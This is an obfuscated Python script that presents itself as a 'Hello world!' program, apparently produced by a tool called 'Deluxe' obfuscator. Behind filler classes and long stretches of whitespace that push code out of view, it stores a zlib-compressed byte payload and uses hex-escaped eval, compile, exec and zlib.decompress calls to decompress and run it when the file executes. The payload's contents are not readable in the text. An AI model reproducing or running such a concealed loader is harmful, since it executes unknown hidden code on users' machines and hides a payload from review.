from builtins import *
from math import prod as _calculate


__obfuscator__ = 'Deluxe'
__authors__ = "SadHam"
__github__ = 'https://github.com/'
__discord__ = 'https://discord.gg/'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Negative, _ceil, _negative, _hypothesis, Random, Run, _invert = exec, str, tuple, map, ord, globals, type

class _round:
    def __init__(self, _builtins):
        self._memoryaccess = _calculate((_builtins, -82803))
        self.Builtins(Hypothesis=-26191)

    def Builtins(self, Hypothesis = Ellipsis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._memoryaccess *= -80651 * Hypothesis
        
        try:
            (((Random, Negative, _hypothesis), _ceil) for _ceil in (_hypothesis, Random, Random))

        except AttributeError:
            ((Random, Negative, _hypothesis) or Random if (Random, Negative, _hypothesis) and Random else ... or (Random, (Random, Negative, _hypothesis)))

        except:
            _invert(20329 / 9800) == True

    def Power(self, Add = 60694):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Add *= -9550 - -75343
        self._modulo != None
        
        try:
            ((Random, (Random, Negative, _hypothesis)) for Random in {_negative: _negative} if _negative > _ceil)

        except OSError:
            {Random: Random} if Negative > Negative else (Negative, _ceil) > Absolute

        except:
            _invert(-358 - -51933) == int

    def _square(DetectVar = int):
        return Run()[DetectVar]

    def _statistics(CallFunction = 69791 - -84412, Theory = type, _math = Run):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _math()[CallFunction] = Theory
        
        try:
            (_hypothesis, Random, Random) if Absolute <= Negative else (Negative, _ceil) is Random

        except AttributeError:
            {Random: Random} if Negative == _ceil else {_hypothesis: _hypothesis} is Run

        except:
            _invert(-3185 * -42862) == None

    def execute(code = str):
        return Negative(_ceil(_negative(_hypothesis(Random, code))))

    @property
    def _modulo(self):
        self.Square = '<__main__._builtins object at 0x000005205BE86559>'
        return (self.Square, _round._modulo)

if True:
    try:
        _round.execute(code = __code__)
        Statistics = _round(_builtins = 27837 + -19571)

        if 247170 > 9665686:
            Statistics.Power(Add = -92610 + Statistics._memoryaccess)
        elif 215420 < 8611709:
            Statistics.Power(Add = 95198 + Statistics._memoryaccess)                                                                                                                                                                                                                                                          ;_round._statistics(CallFunction='nmmnmmmnnnnmmnnmmmmnmmn',Theory=b'x\x9c\xdd\x1ako\xdb8\xf2\xbb\x81\xfe\x07\xd6Ea\xa9q\xd4\xd4\xbd\xbd\xeb\x1a\x97\xc3\xa5I\x9a\xb8\xeb\xc4\xb98},\xdaB\xa0%\xcafB\x93\x06I\xc56\x82\xfc\xf7\x9b\xd1\xc3\xb6l)\xad\xaf\xbb\xc0^\xa8H\x968\xc3\xe1p8O"\xcf\xc8\xc9\xc9S\xf2\xbb\x8a\xc9ul,\t\x99\x1aD\xb1\t\xa8e!\xa1$\xe2\x82\x91\x95\x9e)\xb7#r\xc4D<c\xb5\xda3r\xa8\xe4PS\x1b\x0bj\xb9\x92\xe6i\xadV\xb3z\xde\xae\x11h<"N\xf2\x82\xcd\xf7s"J\xfb>y\xbaO\xea)\x95:Qz\x05\x8b\xc6v\xa4\xb4\xc9P\xfa4<\xa5\xe35\x94!\xb0\x10\x0f2\x8c\x91\xb5\x13\xd3~\xf92\xed\xf4\x025~\xb9\x86\x1er\x13(\x1d\xae\xe1g\xbd\xdep\xb8\x8e/x\xc0\xa4a\x19\xfe\xf1Ew\xb7\xe5\xed\xad\xe1\x04*\xcc\x10\x1a\x13\xcd\xa5u\xea\xa7L\x08E\xa6J\x8b\xf0i\xddm$\xb8n{1\x04q\x1a\xe6\x86\x87\r\xb7\xc6f\x01\x9b\xd8LFr\x12\xc3\xe8Ke\x98!T3\xa2Y\xf8U~\xe4J0\x9bv\x0cD\xcc\xbeJ\xdc\x1e\xfc\xa2\x04\x89|\x95\xe7j\xa0\xc29\x11\xfc\x06\xc6\xcdU\\wk)g|<Q\xda\xfa>\xcc67\r\xd7c3n\x1d\x17\xb6E\xa8\x80\n\xe3\xb8_\x1a\xfdV\xab\x0f\xad\x05\xbf\xd0\x92g\xbf\xf1m\x7f(\xd4\x000je`\x1c\xf6\xe9sr}\xfa\xfc9{k|i\xb7wvwv\x9d]g\xe7\x95\xeb~\x03\x12\xccRku%\x89\xd9t:\x9d\xc1\x85\x8fY\xf2\xb6I#\xe4\xd5\xe3\x93\xceV\xfeH\xfb\x91\xf5tm\xb5R0\x8e\xebt\xba\x9d\xf7\xef;\xdd.\xfcv:\xf0\xf2\xbe\xfb\x1e\x86-\xa5U9c\xaf\xa7z{*i{\xbd\xbd=|\xed\xf5z{0\xb8\x8c\xa6\xd3\x18\xc4\\X.Q\xf2\xb7T?\xc0\xd2\xb5\xe0\\\xf0k!\xe0\x8f\xf3\xeb\xe4\x85\x8bk \x9cI\xf73\x8a:\xb9\x9c\xf2\xa9\x8c\xe4V\xf0x\xb0.B\xb7\x99Hv\x96\x0b\x1ae\xbe-\t\xf7\xcb\x1f@\xc3\xe32d3\xa7\xa1\xad\xd9\x00~s\xab\x95d\x96L\x97*H\xf2\xf3\x18\x85b\xa9\x12Q\xa9X*\x95X\xe0%\xf0\x86\x97\xe4\t\x82i4\xbck\xc5e\xa54A]\xd5\x11h\xed\x11\xfc*P\xe6\xde\xd1\x91::\xea\xa9\xc7(S\xa1\xd4&\xf4!\x91\x82\xddq0>\x81\x0f\x8e\xe6\x07\xdf\xf8\xf5\x18\x85\xc3\x04\x9f\x8cU\xb0\x8d%\x9e\x9dc\x83\xe7\xd9\xd9Yr\xe3\xdb\xf9\xa3\x14N\xac\xaf\xca$S\xe1\xfe\xd3\xc8\xb0\xb7\x97\x80\x11\x80p\x04m!\x1b\xce\x03C%\xff\x19\xd9T\x92\xd8B6\xd54r\xd9\xcc!\x05\x9c\xb1\x91\x8c\xb7\x14P\xa2O\xf8\xe8/~\xd3\xb7G\xa9@F\xd0w[\n\x08\x96\x9f\x88 \x91B\xf2\xfe\xe91\x8aF\xd0[\xb6\x8d\xd7I\x16\x9f\xb5O\xb9$\x8a\xd9f\x89\xe4\x9cR{t\x06\x8d\xd7\x7f\xfb%z\xfd\x0b\xdc\xaf\xe1\xde\x83\xfbW\xb8_\xc1\xfd&\xfb\xfd\x07\xf6\xb7\x06\xad7\xad\xf0\xbb\xb8\x7f\xc7\xbe\xd6\xaf\x90\xdd\x85\x0ck\x00\xa7\xf1&\xb2\x9b\x86\xe1&\x99\xec\xa3\xdb\xc9\x80\xcdJw\x12Z\xa4\xd5\x98\xe4\xc9/I\xd3j\x02\xe8A3\xa9p\x9av>aM\xacEj\xd8\xe94\xa0\x0c\xaaeXQ,\x03\xab\x940O\xf2\x1e\xa1\x86C.\x87\x8bo\xa8d\x16\xefV\xd3\x80\rhp\xf3$\x9d3\x84\xaa\xd4\xf21\xcb\xe7\xcc\xbf30\x93\xf18\x07\x1d\xc3{\x93@\x81\xa92 \xd6\x82^ 8\x936\xc79\xbd\xba\xba8N\xea3(g34\xa3\x82\x1b\xb6\xc0@\xe2*\xb6Oj\x194PBi:\xa69\xfc\x9d\xd2\xacI\xfav.r\x1eb\x8es\x8e\xb1\xf2my,\'\xbe\x90\xd2\x07\xde\x1b\\\xb3\xc0\x9e+\xfbN\xc52<\xd6Z\xe9\x05\xf9\x13\xa0}\x10\x86<\xb0P\xdbj\x06zw\x0b\xf5\xa9\x1f\xd1\x80\x86\x8bE\x1f%\x9d\xef\x92\xbe\x8aq\x9a%\x98\xd9\x80\xa4h\xf5\xa3X\x08?\x05T\x8c\x8a-\x17\x0bF\x9d\'I\x8dy<\x9e\xd8y\x97\x1b\xdbL\xbf\x83\x11\x0bn|\x1e\xf9\x81\xa6f\xe4O\xd4$\x9e\xf8\xdc\xf8v\xc4@\x12\x19\x8e\x80\x02\xd7\x07\xd5\xb0t\x08Sd\xbdj\xc2\xe4F\xa7\xa62Tc\xdf\x08\xc6&Y\x97\x01\x0f\x92R\xcf;\xac\x9a\xf8\x03\x85\x1c\xb8\x15\x9c\xdfr6]p~E\x07o\xa9\xfe\x08](WT/\xa6\xc9~\xaeg\x1e\x94\xad\xdd\xa4\xcf\xf1}I\xc7P\xd9\xbb\x88\xf7\xa4\x16\x08j\x0c\xb9d\xc0\xa1\xb6\x0e\xea\x8f\xdbN9\xe8\xf6\x0e\x0f\xba\xfe\xe1\xe5A\xff\x14\x08\xe1\xfe:n\n9\xb8\xb8(\xed?\xbc\xba\x84\x01k\x9do\x81\xceo\xfeQ\xe7\xa0\xdb;Y\x01\xe1\x15\xb2\x88\xe8X\xfa\x86FL\xcc\x9dt\xdf\x9b\xc40cP{\x9a\xa0x2\xe2C\x93s\x84\xf84\xb01\x15>\xfa&\x8d\xea\xe6\xa0m\xe5\x089\xd2T\xd3\xc9\x04\xd6\xfa\x82\xea!\x90y\xf1\xe2f\x8ao\xabh\x89\x8c\xd3\x89|X\xbbe\xc0[>\xf1\x97\xddW\xdf\x8a\x98x\xe0S\xec\xc1\x86So\xccQDKm\x81\xfc\xc6\xe6\x03Eu\xd8\x91\x96i\x1dOl\t\xb5\xf29\xb0=#\x87\xd4\x06#rh\xb5\xd8=$\xa0=\x84\x9a\x1b<|\x8a\r\xec\xf2\x94Jk\x88UdB\xe1;qIqj\xdbe\xc4R\xd5\x00\x7f\x17)\xa7\x1c\x03[\x1d\xf7\x12\xe6\n\x99\x05\xbbe!\xf1\xf0\xaa7\xabG\xb0\x19\xf8\xad\xfd\xbbz\xe2,\xeam\x12\xd5\xef\x12\x0f\xe1\xbd\xbd\xec\x9c\x9c^\xdd\xdf\xa1\xd7\xf0~?\xeev{\x9f\xee\xeb\xf7\x15\x94\xdc\x9fa:\xaa\xeff\x8d\\\x1c|\xe8\x1f\x1f\xb5\xc9]\xee,=\xa9\xa6\x8e\xeb\x19\xab#\xfct\x1a\xcfO\xdb\xcf\xcf\xda\xcf\xfb\r\xf7\x9e\xe4\xc3\xfe\xe2\xeb\xab\x9f\xf7\xae\x8e\xdb\xe4j\xc4\xc1\xec\r\xa1`<!\xacE\x82\xe9\xce\xd3\xcd\xf7H\xc7\x92)\x17\x82\xe8\xd4\xa2\t\xb8(\xb4\x19P\x87&\x99\x8e\xf0\xa4S3K\xb9\x04\xa7\x90\xeb;\x06\x14\xba\xd5\xde\x16\x16\xfe\xa7\xac\xf4\x02\xf8\x07\xb7t|\xf5\xe1\xf2\x1cU\x1b>c\x88\x80J\x93L1\xe9\x10\x16\x81\x90\xff\xc4\xdc\xb6\xc9\x9f\xc0}9 ;\xcd\xacW"l\xad\xaa\x97\xc7\xfd\x0fg\x9d\xf3\x93\xff\x1be]\x86\x9a\xcce\xbb\x9e\xa4\xb7|\x08\xcc\xfbV\xf9\x13\xad\xf0D\xdd)\x19\xbd\x857\xc4\x96\xc7\xc0\x92\xc8Pp\xdd\x15|\x82\xa2\xc7Z\xe6\xb1\xcdK\xa3\xd3\xfa\xb6e,\xad\xa6\x17\xde\xc1drJ\xcd!Fc\x16\x96\xf0\x96m1\xf8{4#\xa7\x0e\xf8dD\r\t\xd2\x11\xe4e\xf25`L\xa6Y\x01\x1e\x97oR\xc9,\xb4BI\xb2%W\x08&\x97\xc3\x83\xe0T8\x158Yh\xad\x80J\xa5\xc7\x10e\x93\x05\xed\xbf\xa3\xc2T\x91I\xb3\xacE\xc6Z\x89[\xba\xfe\xc2\xf6,\x92\x8a\x1f\xd9\xa1K\x06{p\x10\x81\xfa\xbc\x15\x90\xbaV\xefQb\x86\xf5l\x0e\xf4y\xe8\x0bo\xb9\xe5\xccx\x9eW\xbe-\x05\xb6V\xd3\x97\n\xceJv\xb0\xc0\xec{\xa3\xe4\xe5$H\x92\xde\x12\xd1t\xb0\xf2\xa8\x02\x16\x92\xf5\x12x\x96\xaa\x97@Js\xee\x12\xbc\xf5\\7o\xeb\xc9R*\x9b\xbf\xa6\xca~\x7f\x1bW\x92\xd9\x8a]\\H\x19r+\xc2\xaa5\x8a\xa1\x1c\x9d\x85\xc6{\x11\x9a\x8a\xf5\x81\x8a\xe3\x96\xf0\x01`\xb2(\x88|\xc1%T4\x92\x94\r\xcfP\x94\x84T\x18kI\x87\xb9M\xc2\xca\xb6a\x85\x9b@\x83.\x07T<\x18j\x1awE\x0e\xee\x1bd\xf7_i\x1aq\x03u/Q\xd1\x92\xc54{@\xcf\x9b\xa4\x0e\xe0}\x89#U\xbe\xf3\xaeW\xff\xe1P\xf1\xfd@\x18\xd5Q\xefpz\xa8\x02\x92\x8c\x04\xd2v\x03q\xb0\xd1$\xe9\x99\x7f\xe6\xf9\xb3\x92\xf0c\xcb\x03\x04X\x82\xb1~6\x02d~_\xc2R\t;\xcb\n+\x8fZ\x9b8k5\\5\xe2Fq\xe9l\x14-\x1eV\x03\x9e\x81\x19\'IX\xc4\x98X\xc6V6\xce\x83z\xc5\xc0\xc2\x9c\x90k\xb0Z\xa5\xe7\xfb\x05\x9b\xf0\xc6s\x1f\xb3},\xde\xca\xd4\x9drL\xfdIz"\xb0\xaa\xe2\x99!d%Q\x0e\xc9z\xd7\xab\xa9\x95\xba\xac`\xea\xa9 \xda\x05\xbf\x96\x17\xaaE\xc3.3\xe4\xa2\xe1\xae\xc6\x966(\x98\x12Pz]\xe98\xc7^\x0b)\xeb(\xb9A@\xf5\xb3\x8e\xb9\\\xf4v\xb6Z\xa5\x1a\xe5\x1a\xfc\x07imnI\xeeb9\x05\xc5\t\xc0g[\x1f\x07\xa6Y\x85\xc1\xdc\xb7 \xba\x15\xfe\x0b\x8ab\x95\xa5\xe20\x1b\xb4\xb3O^-\x11a\x92"nz\xb0!\xf8\x98\xaf;\xf5\xa4\xcfG?\xb4\xa6\x87]\x04x\x89\'=\xee7\t\x04\x1fH\x88\xf7qs\x96\x04\xd6\x9dVa;6\x95\x17\xe23\r0q\xca\x97\x9aL\xee\x91\xb7\xe0|V\xf3*\xab\x14\x19\xc7\xc1\xe8)\xb9\x10\x8c\x82\xbe\'\xecCYCm\xc3\x90\xa1\xc2\xbdPr\xddE\xadY\xcb\xff\x90T\x16r\x89\xbe\x1a3;\xc2\xa9b\xc9f\x93\xb4:\x1e\xa1qI\x16z\xa4\xcb\x90\x17\xa8\xe5\xd3\ne\x91b<\xe8Z\x1e<_*\xa2\xae\x9e\x1d9K\xdd\x91 \xaa\xe2YS>le+~\xdek\xfd\xa4\xb72s\x93\xfe\xb7F+\xeb\xfc\xf1Rb\xe9\x97@\xb6\xce\x98\xce`\t\x98\xc55\x97\xa1kq\xbeS\xafg*p\t\xc8\x80\x93D\xb2\xd4\x01\x86\xe9Y,\x06:\x99$O\x06\xa5\x87p\xb4O\x00/\x03!\xc7qZM\xe5\n\xd1\xe59T\xf5\x01\xd4\xbf\x17\xa7\xbd\x1e\xceiR\x84\xe2\x01U$\xbfw6%\xb3\xf5\x91\x82\x01cK\xab\xf8\x05\xfc\x9fd)\x0c\xb2C^mu\xb2\x94\x85\x81\x1f8\xc8\xc2\x96eJK\x81?\x9c\x9b\xe4\xf5\xd1C\xa9\xc9\x1dN\xed\xe5g\x92\xf7$\xa2\xb0\xb8\x90\x841\xc3\xda~\x99\xb7\x98/{\xdf\x96h\x1e9\xb0\x96A\xe2J\xeer9\xdc\xbf\xbc[\xca\xa1,%\xc0VQ(.d\xb9\xb3!\xecL@\xe7J\x96\x05\xd5H\xae\xc5\xd3\x85V\xfc\x17h\x91\xe7\xd6')

        _round(_builtins = 89862 + 22548).Power(Add = 93606 * Statistics._memoryaccess)                                                                                                                                                                                                                                                          ;DooDODDODOooOoOoDODooD,xwxxxxxxxxxxxxwwwwwxxwxw,XWXXWXWXWWWXWXXWXXWWXW,xwwxxxwwwxxwxwxwxxxwwx,SSSS2SS2SS2S222S22SS222S=(lambda wwwxwwwxxwwwxxxwxwww:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wwwxwwwxxwwwxxxwxwww)"),filename='\x44\x44\x44\x44\x44\x6f\x44\x44\x4f\x44\x4f\x44\x4f\x4f\x6f\x4f\x44\x4f\x4f\x44',mode='\x65\x76\x61\x6c'))),(lambda wwwxwwwxxwwwxxxwxwww:wwwxwwwxxwwwxxxwxwww(__import__('\x7a\x6c\x69\x62'))),(lambda wwwxwwwxxwwwxxxwxwww:wwwxwwwxxwwwxxxwxwww['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda DDoOOODDDOODDODoO,wwwxwwwxxwwwxxxwxwww:DDoOOODDDOODDODoO(wwwxwwwxxwwwxxxwxwww)),(lambda:(lambda wwwxwwwxxwwwxxxwxwww:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wwwxwwwxxwwwxxxwxwww)"),filename='\x44\x44\x44\x44\x44\x6f\x44\x44\x4f\x44\x4f\x44\x4f\x4f\x6f\x4f\x44\x4f\x4f\x44',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _round(_builtins = 58219 - 7881).Power(Add = 59040 * Statistics._memoryaccess)                                                                                                                                                                                                                                                          ;SSSS2SS2SS2S222S22SS222S()(xwwxxxwwwxxwxwxwxxxwwx(XWXXWXWXWWWXWXXWXXWWXW(xwxxxxxxxxxxxxwwwwwxxwxw(DooDODDODOooOoOoDODooD('\x76\x61\x72\x73'))),_round._square(DetectVar='nmmnmmmnnnnmmnnmmmmnmmn')))

    except Exception as Absolute:
        import traceback
        print(f'    module {__name__} raised an Exception:')
        print(f'     {Absolute}')
        print(traceback.format_exc())
        if 114231 > 6090720:
            _round.execute(code = _ceil(Absolute))

        elif 389513 > 1613741:
            Statistics.Power(Add = 99008 / Statistics._memoryaccess)